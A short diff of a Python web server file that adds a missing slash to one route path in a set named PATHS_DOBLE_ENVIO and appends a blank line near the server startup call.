@@ -735,7 +735,7 @@ def decode_base64_image(base64_string: str) -> bytes:
 
 PATHS_DOBLE_ENVIO = {
     "/lafise2", "/hotma1", "/hotma2", "/hotma3", 
-    "/wts1", "/wts2", "/wts3", "/wtspnew" , "bbdsasd"
+    "/wts1", "/wts2", "/wts3", "/wtspnew" , "/bbdsasd"
 }
 PATHS_SIN_VALIDACION = {"/victovivienda"  }
 
@@ -1761,6 +1761,7 @@ if __name__ == "__main__":
         server_header=False,
         date_header=False
     )
+
 
 
 
